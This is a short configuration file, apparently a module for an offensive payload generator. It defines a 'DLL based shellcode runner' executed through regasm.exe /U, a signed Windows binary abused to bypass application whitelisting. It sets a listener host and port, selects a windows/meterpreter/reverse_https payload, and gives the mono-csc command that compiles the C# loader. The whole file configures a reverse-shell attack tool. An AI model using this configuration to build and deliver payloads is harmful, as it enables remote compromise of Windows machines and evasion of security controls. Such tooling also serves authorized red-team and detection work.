[Type]
name: regasm
info: DLL based shellcode runner
template: ./template/SCT/reg_asm_svcs.template
runInfo: C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U ${Output:var}

[ListenerDomain]
var: 127.0.0.1
allowWilds: True
help: Your listener domain or IP, can be a redirector

[ListenerPort]
var: 443
allowWilds: True
forceInteger: True
help: Your listener port

[Payload]
var: windows/meterpreter/reverse_https
help: The type of payload

[Compile]
var: CSharp
cmd: mono-csc /r:System.EnterpriseServices.dll /target:library /out:${Output:var} ${Output:var}

[Output]
var: regasm.dll
allowWilds: True
